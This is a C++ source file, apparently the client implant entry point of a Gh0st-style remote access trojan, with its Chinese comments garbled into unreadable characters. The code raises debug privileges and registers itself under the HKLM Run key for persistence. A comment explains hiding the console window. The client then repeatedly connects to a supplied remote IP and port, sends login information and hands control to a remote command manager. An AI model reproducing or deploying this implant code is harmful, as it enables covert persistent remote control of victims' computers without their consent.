// ClientDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "IOCPClient.h"
#include <IOSTREAM>
#include "LoginServer.h"
#include "KernelManager.h"
using namespace std;

// �Զ�����ע����е�ֵ
#define REG_NAME "a_ghost"

// Զ�̵�ַ
CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "", 0};

// Ӧ�ó���״̬��1-���ض��˳� 2-���ض��˳� 3-����������
BOOL g_bExit = 0;
// �����߳�״̬
BOOL g_bThreadExit = 0;

HINSTANCE  g_hInstance = NULL;        
DWORD WINAPI StartClient(LPVOID lParam);

#if _CONSOLE

enum { E_RUN, E_STOP } status;

//����Ȩ��
void DebugPrivilege()
{
	HANDLE hToken = NULL;
	//�򿪵�ǰ���̵ķ�������
	int hRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

	if (hRet)
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		//ȡ������Ȩ�޵�LUID
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		//�����������Ƶ�Ȩ��
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

		CloseHandle(hToken);
	}
}

/**
* @brief ���ñ�����������
* @param[in] *sPath ע����·��
* @param[in] *sNmae ע���������
* @return ����ע����
* @details Win7 64λ�����ϲ��Խ��������ע�����ڣ�\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note �״�������Ҫ�Թ���ԱȨ�����У�������ע���д�뿪��������
*/
BOOL SetSelfStart(const char* sPath, const char* sNmae)
{
	DebugPrivilege();

	// д���ע���·��
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// ��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// �ж��Ƿ�ɹ�
	if (lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// �ر�ע���
	RegCloseKey(hKey);

	// �ж��Ƿ�ɹ�
	return lRet == ERROR_SUCCESS;
}

// ���ؿ���̨
// �ο���https://blog.csdn.net/lijia11080117/article/details/44916647
// step1: ��������"�߼�"������ڵ�ΪmainCRTStartup
// step2: ��������"ϵͳ"����ϵͳΪ����
// ���

BOOL CALLBACK callback(DWORD CtrlType)
{
	if (CtrlType == CTRL_CLOSE_EVENT)
	{
		g_bExit = true;
		while (E_RUN == status)
			Sleep(20);
	}
	return TRUE;
}

int main(int argc, const char *argv[])
{
	if (!SetSelfStart(argv[0], REG_NAME))
	{
		std::cout << "���ÿ���������ʧ�ܣ����ù���ԱȨ������.\n";
	}

	status = E_RUN;

	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, "ghost.exe");
	if (ERROR_ALREADY_EXISTS == GetLastError())
	{
		CloseHandle(hMutex);
		return -2;
	}
	
	SetConsoleCtrlHandler(&callback, TRUE);
	if (argc>=3)
	{
		g_SETTINGS.SetServer(argv[1], atoi(argv[2]));
	}
	if (strlen(g_SETTINGS.ServerIP())==0|| g_SETTINGS.ServerPort()<=0)	{
		printf("��������: ���ṩԶ������IP�Ͷ˿�!\n");
		Sleep(3000);
		return -1;
	}
	printf("[server] %s:%d\n", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());

	do{
		g_bExit = 0;
		HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);

		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}while (E_RUN == status && 1 != g_bExit);

	status = E_STOP;

	CloseHandle(hMutex);
	return 0;
}
#else

BOOL APIENTRY DllMain( HINSTANCE hInstance, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		{
			g_hInstance = (HINSTANCE)hInstance; 

			break;
		}		
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

// ��������һ��ghost
extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
{
	g_bExit = FALSE;
	g_SETTINGS.SetServer(szServerIP, uPort);

	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
	if (hThread == NULL) {
		return;
	}
#ifdef _DEBUG
	WaitForSingleObject(hThread, 200);
#else
	WaitForSingleObject(hThread, INFINITE);
#endif
	CloseHandle(hThread);
}

// ֹͣ����
extern "C" __declspec(dllexport) void StopRun() { g_bExit = true; }

// �Ƿ�ɹ�ֹͣ
extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }

// �Ƿ��˳��ͻ���
extern "C" __declspec(dllexport) BOOL IsExit() { return g_bExit; }

#endif

DWORD WINAPI StartClient(LPVOID lParam)
{
	IOCPClient  *ClientObject = new IOCPClient();

	g_bThreadExit = false;
	while (!g_bExit)
	{
		DWORD dwTickCount = GetTickCount64();
		if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
		{
			for (int k = 500; !g_bExit && --k; Sleep(10));
			continue;
		}
		//׼����һ������
		SendLoginInfo(ClientObject, GetTickCount64()-dwTickCount);

		CKernelManager	Manager(ClientObject);   
		bool	bIsRun = 0;
		do 
		{
			Sleep(200);

			bIsRun  = ClientObject->IsRunning();

		} while (bIsRun && ClientObject->IsConnected() && !g_bExit);
	}

	cout<<"StartClient end\n";
	delete ClientObject;
	g_bThreadExit = true;

	return 0;
} 
